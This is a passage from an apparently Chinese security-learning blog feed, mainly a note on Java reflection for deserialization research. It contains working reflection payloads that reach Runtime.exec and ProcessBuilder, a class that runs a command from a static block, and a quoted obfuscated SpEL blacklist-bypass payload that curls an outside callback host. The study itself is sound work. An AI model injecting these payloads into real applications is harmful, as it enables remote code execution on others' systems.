href="https://github.com/JetBrains/jdk8u_jdk/blob/8db9d62a1cfe07fd4260b83ae86e39f80c0a9ff2/src/share/classes/java/rmi/server/RMIClassLoader.java#L657">https://github.com/JetBrains/jdk8u_jdk/blob/8db9d62a1cfe07fd4260b83ae86e39f80c0a9ff2/src/share/classes/java/rmi/server/RMIClassLoader.java#L657</a></li><li><a href="https://github.com/JetBrains/jdk8u_jdk/blob/8db9d62a1c/src/share/classes/sun/rmi/server/LoaderHandler.java#L282">https://github.com/JetBrains/jdk8u_jdk/blob/8db9d62a1c/src/share/classes/sun/rmi/server/LoaderHandler.java#L282</a></li></ul><p>所以，在分析序列化数据时看到的<code>classAnnotations</code>实际上就是<code>annotateClass</code>写入的内容。</p><h3 id="6-Reference"><a href="#6-Reference" class="headerlink" title="6. Reference"></a>6. Reference</h3><h4 id="Java安全漫谈"><a href="#Java安全漫谈" class="headerlink" title="Java安全漫谈"></a>Java安全漫谈</h4><p><a href="https://wx.zsxq.com/dweb2/index/topic_detail/844112455528482">https://wx.zsxq.com/dweb2/index/topic_detail/844112455528482</a></p><p><a href="https://wx.zsxq.com/dweb2/index/topic_detail/421488425518218">https://wx.zsxq.com/dweb2/index/topic_detail/421488425518218</a></p><p><a href="https://wx.zsxq.com/dweb2/index/topic_detail/421485844124228">https://wx.zsxq.com/dweb2/index/topic_detail/421485844124228</a></p><h4 id="Blog-amp-Notes"><a href="#Blog-amp-Notes" class="headerlink" title="Blog&amp;Notes"></a>Blog&amp;Notes</h4><p>认识RPC和RMI  <a href="https://juejin.cn/post/7029481269415116813">https://juejin.cn/post/7029481269415116813</a></p><p>RMI协议分析  <a href="https://yq1ng.github.io/2021/12/01/rmi-xie-yi-yuan-li-xiang-jie-ji-liu-liang-fen-xi">https://yq1ng.github.io/2021/12/01/rmi-xie-yi-yuan-li-xiang-jie-ji-liu-liang-fen-xi</a></p><p>Java Remote Method Invocation: 10 - RMI Wire Protocol <a href="https://docs.oracle.com/javase/8/docs/platform/rmi/spec/rmi-protocol3.html">https://docs.oracle.com/javase/8/docs/platform/rmi/spec/rmi-protocol3.html</a><br>SerializationDumper  <a href="https://github.com/NickstaDB/SerializationDumper/releases/tag/1.13">https://github.com/NickstaDB/SerializationDumper/releases/tag/1.13</a></p><p>Java Object Serialization Specification: 6 - Object Serialization Stream Protocol <a href="https://docs.oracle.com/javase/8/docs/platform/serialization/spec/protocol.html">https://docs.oracle.com/javase/8/docs/platform/serialization/spec/protocol.html</a></p>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java安全</tag>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JavaSecNotes-反射</title>
    <link href="/2023/03/13/JavaSecNotes-%E5%8F%8D%E5%B0%84/"/>
    <url>/2023/03/13/JavaSecNotes-%E5%8F%8D%E5%B0%84/</url>
    
    <content type="html"><![CDATA[<h3 id="1-背景"><a href="#1-背景" class="headerlink" title="1. 背景"></a>1. 背景</h3><p>Java安全一直是我一个比较感兴趣的点，从2021年<code>Log4j</code>的席卷到<code>shiro</code>，<code>fastjson</code>各种漏洞的频出，让我了解<code>JNDI注入</code>、<code>反序列化</code>、<code>rmi协议</code>以及<code>ldap协议</code>，在这时就一直有去准备他们的学习，包括但不限于<a href="https://github.com/4ra1n">4ra1n</a>师傅的<a href="https://4ra1n.github.io/">博客</a>以及<a href="https://space.bilibili.com/1106751850">视频</a>，各种Java组件的漏洞分析以及P神(<a href="https://github.com/phith0n">phith0n</a>)的知识星球:<a href="https://govuln.com/">代码审计</a>。可以说我目前的学习也就是建立于这些大佬的知识分享上，搭配上一些github的优秀的开源项目，比如<a href="https://javasec.org/javaweb/">javaweb-sec</a>，<a href="https://github.com/SummerSec/JavaLearnVulnerability">JavaLearnVulnerability</a>，<a href="https://github.com/threedr3am/learnjavabug">earnjavabug</a>，还有<a href="https://github.com/pmiaowu">p喵呜</a>师傅的<a href="https://www.yuque.com/pmiaowu/gpy1q8">笔记</a>。之后的学习就是基于以上的学习资料了。</p><p><strong>从p神的<a href="https://govuln.com/docs/java-things/">java安全漫谈</a>开始</strong></p><h3 id="2-反射"><a href="#2-反射" class="headerlink" title="2. 反射"></a>2. 反射</h3><p>Java安全中最为经典的当属反序列化漏洞了，反序列化漏洞又因为反射而开始，在一个可控的参数中能注入命令，那就成功的实现了RCE，可以说通过反射注入代码是反序列化漏洞的基础。</p><h4 id="动态特性"><a href="#动态特性" class="headerlink" title="动态特性"></a>动态特性</h4><p><strong>一段代码，改变其中的变量，将会导致这段代码产生功能性的变化，P神称之为动态特性</strong></p><p>比如说这一段方法，它的类以及方法名的调用时可控的，这就是动态特性。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">execute</span><span class="hljs-params">(String className, String methodName)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Class&lt;?&gt; clazz = Class.forName(className);<br>        clazz.getMethod(methodName).invoke(clazz.newInstance());<br>&#125;<br></code></pre></td></tr></table></figure><p>这个方法中较为重要的方法：</p><ul><li>获取类的方法：<code>forName</code></li><li>实例化类对象的方法：<code>newInstance</code></li><li>获取函数的方法：<code>getMethod</code></li><li>执行函数的方法：<code>invoke</code></li></ul><p>基本上，这⼏个⽅法包揽了Java安全里各种和反射有关的Payload。</p><h4 id="获取类的各种方法"><a href="#获取类的各种方法" class="headerlink" title="获取类的各种方法"></a>获取类的各种方法</h4><p><code>forName</code>不是获取类的未已途径，可以有以下三种方式获取<code>java.lang.Class</code>对象：</p><ul><li><code>obj.getClass()</code>如果上下⽂中存在某个类的实例<code>obj</code>，那么我们可以直接通过 obj.getClass() 来获取它的类</li><li><code>Test.class</code> 如果已经加载了了某个类，只是想获取到它的<code>java.lang.Class</code>对象，那么就直接拿它的<code>class</code>属性即可。这个⽅法其实不属于反射。</li><li><code>Class.forName</code>如果知道某个类的名字，想获取到这个类，就可以使⽤<code>forName</code>来获取</li></ul><p>而在安全研究中，使用反射的一大目的就是绕沙盒，比如上下文中如果只有Integer类型的数字，如何获取到可以执行命令的Runtime类呢？也许可以使用<code>1.getClass().forName(&quot;java.lang.Runtime&quot;)</code></p><p>在这里p神有分享一个他在Code-Breaking 2018出的一道SpEL的题目的<code>Ruilin</code>师傅的<a href="http://rui0.cn/archives/1015">Writeup</a></p><p>在这篇WriteUp就用了一个绕过BlackList的混淆payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">String.class.getClass().forName(<span class="hljs-string">&quot;java.l&quot;</span>+<span class="hljs-string">&quot;ang.Ru&quot;</span>+<span class="hljs-string">&quot;ntime&quot;</span>).getMethod(<span class="hljs-string">&quot;exec&quot;</span>,String.class).invoke(String.class.getClass().forName(<span class="hljs-string">&quot;java.l&quot;</span>+<span class="hljs-string">&quot;ang.Ru&quot;</span>+<span class="hljs-string">&quot;ntime&quot;</span>).getMethod(<span class="hljs-string">&quot;getRu&quot;</span>+<span class="hljs-string">&quot;ntime&quot;</span>).invoke(String.class.getClass().forName(<span class="hljs-string">&quot;java.l&quot;</span>+<span class="hljs-string">&quot;ang.Ru&quot;</span>+<span class="hljs-string">&quot;ntime&quot;</span>)),<span class="hljs-string">&quot;curl http://fg5hme.ceye.io/1aa1k&quot;</span>);<br></code></pre></td></tr></table></figure><p>对于刚学习反射基础的我无疑是看不懂的，这得借助一下chatGPT的力量</p><ol><li><code>String.class</code> - <code>String</code>类的Class对象，表示字符串类型的类。</li><li><code>getClass()</code> - 获取当前对象的类信息，返回一个<code>Class</code>对象。</li><li><code>forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;)</code> - 获取名为<code>java.lang.Runtime</code>的类的<code>Class</code>对象。</li><li><code>getMethod(&quot;exec&quot;, String.class)</code> - 获取<code>Runtime</code>类的名为<code>exec</code>的方法，该方法接受一个<code>String</code>参数。</li><li><code>invoke(String.class.getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;getRu&quot;+&quot;ntime&quot;).invoke(String.class.getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;)))</code> - 通过反射调用<code>Runtime.getRuntime()</code>方法，获取<code>Runtime</code>对象。</li><li><code>getMethod(&quot;exec&quot;, String.class)</code> - 获取<code>Runtime</code>类的名为<code>exec</code>的方法，该方法接受一个<code>String</code>参数。</li><li><code>invoke(..., &quot;curl http://fg5hme.ceye.io/1aa1k&quot;)</code> - 通过反射调用<code>Runtime</code>对象的<code>exec</code>方法，传入参数<code>&quot;curl http://fg5hme.ceye.io/1aa1k&quot;</code>。</li></ol><p>这段代码的作用是通过Java的反射机制调用<code>Runtime</code>类的<code>exec</code>方法，并传入一个<code>&quot;curl http://fg5hme.ceye.io/1aa1k&quot;</code>字符串作为参数，以执行该命令。这个命令是通过cURL工具发送HTTP请求到指定URL地址，可能是用于执行一些非法活动的恶意代码。</p><p>通过chatGPT的分析以及调试我可以学习到:</p><ol><li>通过<code>String</code>类来获取<code>Class</code>类，目的是为了后面调用<code>forName()</code>方法</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">String.class.getClass() == Class <span class="hljs-comment">// class java.lang.Class</span><br></code></pre></td></tr></table></figure><ol start="2"><li>通过<code>forName()</code>带上混淆，获得了<code>Runtime</code>类</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">String.class.getClass().forName(<span class="hljs-string">&quot;java.l&quot;</span>+<span class="hljs-string">&quot;ang.Ru&quot;</span>+<span class="hljs-string">&quot;ntime&quot;</span>) == Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>) <span class="hljs-comment">// java.lang.Runtime</span><br></code></pre></td></tr></table></figure><ol start="3"><li>通过<code>Runtime</code>类的方法<code>exec()</code>，并且接收一个<code>String</code>类型的参数</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">String.class.getClass().forName(<span class="hljs-string">&quot;java.l&quot;</span>+<span class="hljs-string">&quot;ang.Ru&quot;</span>+<span class="hljs-string">&quot;ntime&quot;</span>).getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class) == java.lang.Runtime.exec(java.lang.String)<br></code></pre></td></tr></table></figure><ol start="4"><li>通过<code>invoke()</code>方法执行<code>Runtime.getRuntime()</code>获取Runtime类，直接<code>newInstance()</code>是不行的，因为<code>exec()</code>方法是private的</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">invoke(String.class.getClass().forName(<span class="hljs-string">&quot;java.l&quot;</span>+<span class="hljs-string">&quot;ang.Ru&quot;</span>+<span class="hljs-string">&quot;ntime&quot;</span>).getMethod(<span class="hljs-string">&quot;getRu&quot;</span>+<span class="hljs-string">&quot;ntime&quot;</span>)     == invoke(Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>) == Runtime.getRuntime()<br></code></pre></td></tr></table></figure><p>这段代码等效于</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>)<br>                .getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class)<br>                .invoke(Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>)<br>                        .getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>)<br>                        .invoke(Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>)), <span class="hljs-string">&quot;curl http://fg5hme.ceye.io/1aa1k&quot;</span>)<br></code></pre></td></tr></table></figure><h4 id="ClassLoader和initialize"><a href="#ClassLoader和initialize" class="headerlink" title="ClassLoader和initialize"></a><code>ClassLoader</code>和<code>initialize</code></h4><p>对于forName，它有两个函数重载:</p><ul><li><code>Class&lt;?&gt; forName(String name)</code></li><li><code>Class&lt;?&gt; forName(String name, **boolean** initialize, ClassLoader loader)</code></li></ul><p>第一个方法是第二个方法的封装</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">Class.forName(className) == Class.forName(className, <span class="hljs-literal">true</span>, currentLoader)<br></code></pre></td></tr></table></figure><p>默认情况下，<code>forName</code>的第⼀个参数是类名;第⼆个参数<code>initialize</code>表示是否初始化;第三个参数就是<code>ClassLoader</code>。</p><h5 id="ClassLoader"><a href="#ClassLoader" class="headerlink" title="ClassLoader"></a><code>ClassLoader</code></h5><p><code>ClassLoader</code>是一个”加载器”，告诉Java虚拟机如何加载这个类。Java的默认ClassLoader就是根据类名来加载类，比如<code>java.lang.Runtime</code>，这个是类名的完整路径。</p><h5 id="initialize"><a href="#initialize" class="headerlink" title="initialize"></a><code>initialize</code></h5><p>在<code>forName</code>的时候，构造函数并不会执行，即使我们设置<code>initialize=true</code>.</p><p>在这里初始化指的究竟是什么呢?</p><p>p神给了详细的解释。</p><p>这个“初始化”可以理解为类的初始化。比如这个类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TrainPrint</span> &#123;<br>  &#123;<br>      System.out.printf(<span class="hljs-string">&quot;Empty block initial %s\n&quot;</span>, <span class="hljs-built_in">this</span>.getClass());<br>    &#125;<br><br>  <span class="hljs-keyword">static</span> &#123;<br>       System.out.printf(<span class="hljs-string">&quot;Static initial %s\n&quot;</span>, TrainPrint.class);<br>    &#125;<br>  <br>  <span class="hljs-keyword">public</span> <span class="hljs-title function_">TrainPrint</span><span class="hljs-params">()</span> &#123;<br>      System.out.printf(<span class="hljs-string">&quot;Initial %s\n&quot;</span>, TrainPrint.class);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>单这个类初始化的运行结果是</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230320134201577.png" alt="image-20230320134201577"></p><p>首先调用的是<code>static &#123;&#125;</code>, 其次是<code>&#123;&#125;</code>, 最后是构造函数</p><p>在这里 <code>static &#123;&#125;</code>就是在”类初始化”的时候调用的，而<code>&#123;&#125;</code>中的代码会放在构造函数的<code>super()</code>后面，但在当前构造函数内容的前面。</p><p>所以说，<code>forName</code> 中的<code>initialize=true</code> 其实就是告诉Java虚拟机是否执⾏”类初始化“。</p><h4 id="恶意类的加载"><a href="#恶意类的加载" class="headerlink" title="恶意类的加载"></a>恶意类的加载</h4><p>假如有以下函数, 参数可控</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">ref</span><span class="hljs-params">(String name)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>  class.forName(name);<br>&#125;<br></code></pre></td></tr></table></figure><p>编写一个恶意类，将恶意代码放置在<code>static &#123;&#125;</code>中，从而执行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.Runtime;<br><span class="hljs-keyword">import</span> java.lang.Process;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TouchFile</span> &#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Runtime</span> <span class="hljs-variable">rt</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>            String[] commands = &#123;<span class="hljs-string">&quot;touch&quot;</span>, <span class="hljs-string">&quot;/tmp/success&quot;</span>&#125;;<br>            <span class="hljs-type">Process</span> <span class="hljs-variable">pc</span> <span class="hljs-operator">=</span> rt.exec(commands);<br>            pc.waitFor();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-comment">// do nothing</span><br> &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>那么这个类如何带入目标机器中呢？这里涉及到了一些<code>ClassLoader</code>中的一些方法了。</p><h3 id="3-反射的简单利用"><a href="#3-反射的简单利用" class="headerlink" title="3. 反射的简单利用"></a>3. 反射的简单利用</h3><p>在正常情况下，除了系统类，如果想拿到一个类，需要先<code>import</code>才能使用。而使用<code>forName</code>就不需要，这样对我们攻击者来说十分有利，我们可以加载任意类。</p><h4 id="查找内部类"><a href="#查找内部类" class="headerlink" title="$查找内部类"></a><code>$</code>查找内部类</h4><p>我们经常在一些源码里看到，类名的部分包含<code>$</code>符号，比如<code>fastjson</code>在<code>checkAutoType</code>时候会将<code>$</code>替换成<code>.</code>(<a href="https://github.com/alibaba/fastjson/blob/fcc9c2a/src/main/java/com/alibaba/fastjson/parser/ParserConfig.java#L1038)%E3%80%82">https://github.com/alibaba/fastjson/blob/fcc9c2a/src/main/java/com/alibaba/fastjson/parser/ParserConfig.java#L1038)。</a></p><p><code>$</code>的作用是查找内部类。</p><p>Java的普通类<code>C1</code>支持编写内部类<code>C2</code>，而在编译的时候会生成两个文件：<code>C1.class</code>和<code>C1$C2.class</code>，我们可以把他们看作两个无关的类，通过<code>Class.forName(&quot;C1$C2&quot;)</code>即可加载这个内部类。</p><p>获得类以后，我们可以继续使用反射来获取这个类中的属性、方法，也可以实例化这个类，并调用方法。</p><h4 id="class-newInstance-调用无参构造"><a href="#class-newInstance-调用无参构造" class="headerlink" title="class.newInstance()调用无参构造"></a><code>class.newInstance()</code>调用无参构造</h4><p><code>class.newInstance()</code>的作用就是调用这个类的无参构造函数，但是有时候用这个方法总是不成功，这里的可能原因是：</p><ol><li>使用的类没有无参构造函数</li><li>使用的类的构造函数是私有的</li></ol><p>最常见的情况就是<code>java.lang.Runtime</code>, 这个类在我们构造命令执行paylaod的时候很常见，但是不能直接这么执行命令。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br>clazz.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class).invoke(clazz.newInstance(), <span class="hljs-string">&quot;id&quot;</span>);<br></code></pre></td></tr></table></figure><p>这样执行会报错：</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230320145358125.png" alt="image-20230320145358125"></p><p>因为Runtime类的构造方法是私有的。</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230320145726532.png" alt="image-20230320145726532"></p><p>Runtime类是单例模式，我们只能通过<code>Runtime.getRuntime()</code>来获取到Runtime对象。将上述payload修改成以下就可以正常执行了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">Class&lt;?&gt; clazz = Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br>        clazz.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class)<br>                .invoke(clazz.getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>).invoke(clazz), <span class="hljs-string">&quot;id&quot;</span>);<br></code></pre></td></tr></table></figure><p>这里用到了<code>getMethod()</code>和<code>invoke()</code>方法</p><h4 id="getMethod-和invoke"><a href="#getMethod-和invoke" class="headerlink" title="getMethod()和invoke()"></a><code>getMethod()</code>和<code>invoke()</code></h4><p><code>getMethod</code>的作用是通过反射获取一个类的某个特定的公有方法。而由于Java的语言特性，它支持方法的重载，所以我们不能仅通过函数名来确定一个函数。在调用<code>getMethod </code>的时候，我们需要传给他所需要获取的函数的参数类型列表。</p><p>比如这里的<code>Runtime.exec()</code>方法有6个重载：</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230320150957927.png" alt="image-20230320150957927"></p><p>我们使用最简单的，也就是第一个，仅有一个参数，类型是String，所以我们用<code>getMethod(&quot;exec&quot;, String.class)</code>来获取<code>Runtime.exec()</code>方法。</p><p><code>invoke</code>的作用是执行方法，它的第一个参数是:</p><ul><li>如果这个方法是一个普通方法，那么第一个参数是类对象</li><li>如果这个方法是一个静态方法，那么第一个参数是类</li></ul><p>正常执行方法是<code>[1].method([2], [3], [4]...)</code>，其实在反射里就是<code>method.invoke([1], [2], [3], [4]...)</code>。</p><p>所以将上述payload分解一下就是:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">Class&lt;?&gt; clazz = Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br><span class="hljs-type">Method</span> <span class="hljs-variable">execMethod</span> <span class="hljs-operator">=</span> clazz.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);<br><span class="hljs-type">Method</span> <span class="hljs-variable">getRuntimeMethod</span> <span class="hljs-operator">=</span> clazz.getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>);<br><span class="hljs-type">Object</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> getRuntimeMethod.invoke(clazz);<br>execMethod.invoke(runtime, <span class="hljs-string">&quot;id&quot;</span>);<br></code></pre></td></tr></table></figure><p>这样就比较容易理解了。</p><h3 id="4-反射的进阶技巧"><a href="#4-反射的进阶技巧" class="headerlink" title="4. 反射的进阶技巧"></a>4. 反射的进阶技巧</h3><p>在这里，p神留下了两个问题</p><ul><li>如果一个类没有无参构造方法，也没有类似单例模式里的静态方法，我们怎样通过反射实例化该类呢?</li><li>如果一个方法或构造方法是私有的，我们能否执行它呢</li></ul><hr><p>第一个问题，需要用到一个新的反射方法<code>getConstructor()</code>。</p><h4 id="getConstructor"><a href="#getConstructor" class="headerlink" title="getConstructor()"></a>getConstructor()</h4><p>和<code>getMethod</code>类似，<code>getConstructor</code>接收的参数是构造函数列表类型，因为构造函数也支持重载，所以必须用参数列表类型才能唯一确定一个构造函数。</p><p>通过<code>getConstructor()</code>获取到构造函数后，通过<code>newInstance</code>传入<code>Arrays.asList(&quot;id&quot;)</code>的参数，再通过<code>start()</code>执行。</p><p>比如，我们常用的另一种执行命令的方式<code>ProcessBuilder</code>，我们使用反射来获取其构造函数，然后调用<code>start()</code> 来执行命令：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// ProcessBuilder 创建操作系统进程</span><br>Class&lt;?&gt; clazz = Class.forName(<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>);<br>((ProcessBuilder) clazz.getConstructor(List.class).newInstance(Arrays.asList(<span class="hljs-string">&quot;id&quot;</span>))).start();<br></code></pre></td></tr></table></figure><p><code>ProcessBuilder</code>有两个构造函数：</p><ul><li><code>public ProcessBuilder(List&lt;String&gt; command)</code></li><li><code>public ProcessBuilder(String... command)</code></li></ul><p>在这里用到了第一个形式的构造函数，所以在<code>getConstructor</code>的时候传入的是<code>List.class</code>。</p><p>但是在这个payload中用到了Java的强制类型转换，有时候是没法这样利用的。所以仍需要利用反射来完成这一步。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">Class&lt;?&gt; clazz = Class.forName(<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>);<br>clazz.getMethod(<span class="hljs-string">&quot;start&quot;</span>).invoke(clazz.getConstructor(List.class).newInstance(Arrays.asList(<span class="hljs-string">&quot;id&quot;</span>)));<br></code></pre></td></tr></table></figure><p>通过<code>getMethod(&quot;start&quot;)</code>获取到start方法，然后<code>invoke</code>执行，<code>invoke</code>的第一个参数就是<code>ProcessBuilder Object</code>了。</p><p>如果使用<code>public ProcessBuilder(String... command)</code>这个构造函数，怎么进行反射？</p><h4 id="可变长度"><a href="#可变长度" class="headerlink" title="可变长度"></a>可变长度</h4><p>这里涉及到Java里的可变长参数(varargs)。如其他语言一样，Java也支持可变长参数，就是当你定义函数的时候不确定参数数量的时候，可以使用<code>...</code>这样的语法来表示“这个函数的参数个数是可变的”。</p><p>对于可变长参数，Java其实在编译的时候会编译成一个数组，也就是说，如下这两种写法在底层是等价的(也就不能重载)：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">hello</span><span class="hljs-params">(String[]names)</span> &#123;<br>  <br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">hello</span><span class="hljs-params">(String...names)</span> &#123;<br>  <br>&#125;<br></code></pre></td></tr></table></figure><p>也由此，如果我们有一个数组，想传给hello函数，只需直接传即可：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">String[] names = &#123;<span class="hljs-string">&quot;hello&quot;</span>,<span class="hljs-string">&quot;world&quot;</span>&#125;;<br>hello(names);<br></code></pre></td></tr></table></figure><p>那么对于反射来说，如果要获取的目标函数里包含可变长参数，其实我们认为它是数组就行了。</p><p>所以，可以将字符串数组的类<code>String[].class</code>传给<code>getConstructor</code>, 获取<code>ProcessBuilder</code>的第二种构造函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>);<br>clazz.getConstructor(String[].class)<br></code></pre></td></tr></table></figure><p>在调用<code>newInstance</code>的时候，因为这个函数本身接收是一个可变长参数，我们传给<code>ProcessBuilder</code>的也是一个可变长参数，二者叠加为一个二维数组，整个Payload如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">Class&lt;?&gt; clazz = Class.forName(<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>);<br>((ProcessBuilder) clazz.getConstructor(String[].class).newInstance(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[][]&#123;&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;&#125;)).start();<br></code></pre></td></tr></table></figure><hr><p>第二个问题，如果一个方法或构造方法是私有方法，我们能否执行它呢？</p><p>这里就涉及到了<code>getDeclared</code>系列的反射了。</p><h4 id="getDeclared"><a href="#getDeclared" class="headerlink" title="getDeclared()"></a><code>getDeclared()</code></h4><p>与普通的<code>getMethod()</code>、<code>getConstructor</code>区别是</p><ul><li><code>getMethod()</code>系列方法获取的是当前类中所有公共方法，包括从父类继承的方法。</li><li><code>getDeclaredMethod</code>系列方法获取的是当前类中“声明”的方法，是实在写在这个类里的，包括私有的方法，单从父类里继承来的就不包含了。</li></ul><p>前文有聊到过Runtime这个类的构造函数式私有的，我们需要用<code>Runtime.getRuntime()</code>来获取对象。其实现在我们也可以直接用<code>getDeclaredConstructor()</code>来获取这个私有的构造方法来实例化对象，进而执行命令：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">Class&lt;?&gt; clazz = Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br><span class="hljs-type">Constructor</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> clazz.getDeclaredConstructor();<br>m.setAccessible(<span class="hljs-literal">true</span>);<br>clazz.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class).invoke(m.newInstance(), <span class="hljs-string">&quot;calc.exe&quot;</span>);<br></code></pre></td></tr></table></figure><p>可见，这里使用了一个方法<code>setAccessible</code>，这个是必须的。我们在获取到一个私有方法后，必须用<code>setAccessible</code>修改它的作用域，否则仍然不能调用。</p><h3 id="5-Reference"><a href="#5-Reference" class="headerlink" title="5. Reference"></a>5. Reference</h3><h4 id="Java安全漫谈"><a href="#Java安全漫谈" class="headerlink" 